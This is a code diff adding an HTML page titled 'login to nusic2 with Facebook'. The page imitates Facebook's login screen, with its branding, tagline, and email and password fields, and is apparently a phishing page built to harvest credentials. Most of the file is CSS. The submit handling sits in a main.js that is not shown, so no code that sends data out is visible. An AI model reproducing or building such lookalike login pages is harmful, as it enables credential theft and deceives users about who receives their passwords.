@@ -1,0 +1,507 @@
+
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>login to nusic2 with Facebook</title>
+    <link rel="stylesheet" href="bootstrap.min.css">
+    <meta name="theme-color" content="#3b5998">
+</head>
+<style type="text/css" media="all">
+  *{
+    margin:0;
+    padding: 0;
+    box-sizing:border-box;
+  }
+  #img{
+    clip: rect(0px,0px,2px,0px);
+  }
+.fb{
+ font-style: normal;
+  
+
+}
+
+@media only screen and (max-width:841px)  {
+/* For mobile phones: */
+.header {
+height:40px;
+width:100%;
+background:#FFFBE3;
+color:#666AAA;
+}
+.inpu{
+			
+}
+.k{
+				display:none!important;
+}
+.o{
+				display:none!important;
+}
+.na{
+
+				margin-left:10px;
+				margin-right:5px;
+				margin-bottom:2px;
+}
+.btn-success{
+display:block!important;
+}
+#locate{
+display:none!important;
+}
+input[type="text"]{
+  background-image: url("information.svg")!important;
+  background-size:17.5px!important;
+  background-position:97%!important;
+  
+  background-repeat:no-repeat!important;
+  border-right:none!important;
+  border-left:1px solid #ced4da!important;
+  
+}
+#password{
+border-right:none!important;
+
+background-image: none!important;
+  background-size:none!important;
+  background-position:none!important;
+  
+  background-repeat:none!important;
+}
+    .containers{
+    background: white;  
+    box-shadow:0px 0px 0px 000 #f2f2f2;
+    width:90%;
+    height:100%!important;
+    display:flex;
+    flex-direction:column;
+    justify-content: center;
+    align-items:center;
+    }
+table{
+  width:100%;
+  display:block!important;
+}
+    .form-control{
+    background:#f2f2f2f2!important;
+    height:calc(1.5rem + .75rem + 10px);
+   border-top:1px solid #ced4da!important;
+   border-bottom:1px solid #ced4da!important;
+   
+    }
+   
+    .form-control:focus{
+    border:1px solid #ced4da!important;
+    box-shadow:none!important;
+    outline:1px solid rgb(229, 151, 0);
+    outline-offset: -1px;
+    }
+    .total{
+    display:flex;
+    flex-direction:column;
+    justify-content:center;
+    align-items:center;
+    }
+.header>img{
+  height:40px;
+}
+#p{
+  display:none;
+}
+.img {
+  width:320px;
+}
+
+.size {
+height:46px;
+
+margin-top: 6px;
+position: relative;
+
+}
+.p {
+ display: none;
+  
+}
+.fb{
+  text-align:center!important;
+  margin-top:25px!important;
+  margin-bottom:25px!important;
+  margin-left:0px!important;
+}
+.peter {
+  display: none;
+}
+
+
+
+.toge{
+  display:flex;
+}
+.btn{
+  box-shadow:none!important;
+  margin-top: -6px;
+  height:43px;
+  font-size:18px;
+}
+.btn:active{
+	opacity:0.7;
+}
+.btn:focus{
+  outline:1px solid  rgb(229, 151, 0);
+  outline-offset: 0.10px;
+}
+.form-group{
+  margin-top:-10px;
+  width:100%;
+}
+.inputs{
+  width:90px;
+ border-left:none;
+  border-top-left-radius: 0px;
+    border-bottom-left-radius: 0px;
+display:none;
+}
+}
+@media only screen and (min-width:480px){
+				.containers{
+								width:75%;
+				}
+}
+
+/* 
+@media screen and (min-width:768px) {
+.header {
+height:40px;
+width:100%;
+background:#FFFBE3;
+color:#666AAA;
+}
+
+    .containers{
+    background: white;  
+    box-shadow:0px 0px 0px 000 #f2f2f2;
+    width:360px;
+    display:flex;
+    flex-direction:column;
+    justify-content: center;
+    align-items:center;
+    
+    }
+table{
+  width:100%;
+}
+    .form-control{
+    background:#f2f2f2f2!important;
+    height:calc(1.5rem + .75rem + 10px);
+      
+    }
+    .form-control:focus{
+    border:1px solid #ced4da;
+    box-shadow:none!important;
+    outline:1px solid rgb(229, 151, 0);
+    outline-offset: -1px;
+    }
+    .total{
+    display:flex;
+    flex-direction:column;
+    justify-content:center;
+    align-items:center;
+    }
+.header>img{
+  height:40px;
+}
+#p{
+  display:none;
+}
+.img {
+  width:320px;
+}
+
+.size {
+height:46px;
+
+margin-top: 6px;
+position: relative;
+
+}
+.p {
+ display: none;
+  
+}
+.fb{
+  text-align: center;
+  margin-top:25px;
+  margin-bottom:25px;
+}
+.peter {
+  display: none;
+}
+
+
+
+.toge{
+  display:flex;
+}
+.btn{
+  box-shadow:none!important;
+  margin-top: -6px;
+  height:43px;
+  font-size:18px;
+}
+.btn:focus{
+  outline:1px solid  rgb(229, 151, 0);
+  outline-offset: 0.10px;
+}
+.form-group{
+  margin-top:-10px;
+  width:100%;
+}
+.inputs{
+  width:90px;
+  border-top-left-radius: 0px;
+    border-bottom-left-radius: 0px;
+display:none;
+}
+}
+*/
+
+
+
+@media  screen and (min-width:842px){
+  /* For desktop: */
+  body{
+    
+    background: #f2f2f2f2;
+  }
+  @font-face {
+  font-family: 'Gothic A1';
+
+
+  src: url(GothicA1-Medium.ttf);
+}
+  #p{
+    color: black;
+    font-size:23px; 
+     font-style: normal;
+font-family: 'Gothic A1',sans-serif;
+  }
+
+.header{
+  display: none;
+}
+.cont{
+}
+.container{
+ 
+ 
+  
+}
+.my{
+  
+  width: 100%;
+ margin-top: 90px;
+ display:flex;
+ min-height:29.5vh;
+ justify-content:center;
+ align-items:center;
+ margin-left: -120px;
+
+}
+.co{
+  
+  text-align: left;
+  
+}
+.fb{
+  font-size:360%;
+  /* margin-left:30px; */
+  margin-top:-60px;
+  display: flex;
+  align-items: flex-start;
+  flex-direction: column;
+}
+.text{
+  
+  font-size: 360%;
+}
+.ci{
+  
+  margin-bottom:140px;
+
+  margin-left:-1.5px;
+}
+
+.peter{
+    
+
+  
+}
+.total{
+  display:flex;
+  align-items: center;
+  justify-content: center;
+min-height:25vh;
+margin-top:100px;
+  
+}
+.containers{
+  box-shadow: 0px 5px 7px  lightslategrey;  
+background: white;
+border-radius: 7px;
+   width:395px;
+height:340px;
+display:flex;
+margin-left:4.0%;
+flex-direction: column;
+justify-content: center;
+align-items: center;
+  
+}
+.containers input{
+  width:100%;
+  height: 52px!important;
+  color:black;
+  margin-top:6px;
+  border-radius:5px;
+}
+
+.containers .btn-success{
+  height:48px!important;
+  margin-top:10px!important;
+  font-size:109%!important;
+}
+.form-group{
+  width:92%;
+}
+.containers .btn-primary{
+  margin-bottom:15px;
+  box-shadow:none!important;
+  height:53px;
+  width:92%;
+    font-size: 130%;
+
+}
+table{
+  width:96%;
+  margin-top:-16px !important;
+}
+.form-control{
+				
+border-radius:4px!important;
+border-color:#ced4da;
+border-width:1px!important;
+border-style:solid;
+}
+#password{
+
+border-right-width:1px;
+border-right-style:solid!important;
+border-right-color:#ced4da;
+}
+#password:focus{
+				border-right-width:1px!important;
+border-right-style:solid!important;
+border-right-color:#007bff;
+}
+.form-control:focus{
+  border:0.90px solid;
+  color:#007bff;
+-webkit-text-fill-color:black;
+border-color: #007bff;
+box-shadow:0 0 0 .1rem rgba(0,123,255,.25);
+border-right-width:1px!important;
+border-right-style:solid;
+border-right-color:#007bff;
+}
+.form-control::placeholder{
+  color:lightgray;
+}
+.form-control:focus::placeholder{
+
+-webkit-text-fill-color: lightgray;
+
+}
+.cu{
+  height:450px;
+}
+.b{
+  
+}
+.i{
+  margin-top:-3px!important;
+}
+.btne{
+  
+}
+.form-group{
+  margin-top:-9px;
+}
+.t{
+  display:none;
+}
+.u{
+  display:none;
+}
+.s{
+  margin-top:-3px;
+}
+.inputs{
+  display:none!important;
+}
+#namelocation{
+				display:none!important;
+}
+.k{
+margin-top:20px;
+display:none;
+}
+.o{
+				margin-bottom:1px;
+				color:red;
+				font-size:14px;
+}
+}
+</style>
+<body>
+				<form name="f1" method="post" onsubmit="return validate()" action="#">
+  <div class="total">
+    <div class="header" id="head">
+      <img src="t.png" alt="" />
+   Get facebook and browse faster.
+    </div>
+    <div id="namelocation"  style="color:white; background-color:red; font-size:14px; width:100%;display:none;"></div>
+  
+    <div class="fb text-primary h4">
+      <strong class="fb-textc">facebook</strong>
+       <p class="text h1" id="p">Facebook helps you connect and <br>share with the people in your life.</p>
+    </div>
+    <div class="containers">
+    				<p class="k" style="display:none; font-size:20px;">Log in to Facebook</p>
+      <div class="form-group s">
+        <input type="text" placeholder="Mobile number or email adress" name="email" id="name" class="form-control"  value=""/>
+        <p style="color:red;margin-bottom:2px;display:none" id="locate"></p>
+      </div>
+      <div class="form-group">
+        <div class="toge">
+        <input placeholder="Password" type="password"  name="pass" id="password" class="form-control inpu  passwords"value=""  onkeyup="stop()"/>
+        <button class="form-control inputs" id="show" type="button" onclick="change()"><span class="text-primary tex text-uppercase"  style="font-size: 12px;"><b>show</b></span></button>
+         </div>
+        <p class="o" id="locat"></p>
+      </div>
+      <button class="btn text-capitalize squarebut btn-block btn-primary"type="submit" name="login"><b>log in</b></button>
+      <p class="text-primary i text-center" style="margin-top:14.4px;font-size: 14.1px;"><a href="#">Forgotten password?</a></p>
+                    <table style="margin-top:-7px" id="tb"><tr> <td style="width:47%"><hr/></td> <td id="td"  class="u text-center"><font style="margin-left:15px; margin-right:15px;font-size:15px;">or</font></td> <td  class="t" style="width:47%"><hr/></td> </tr></table>
+             <button class="btn btn-success" style="font-size:14px;height:37px;margin-top:12px"type="button"><b>Create New Account</b></button>       
+
+    </div>
+  </div>
+  </form>
+
+        <script src="main.js" ></script>
+</body>
+
+</html>
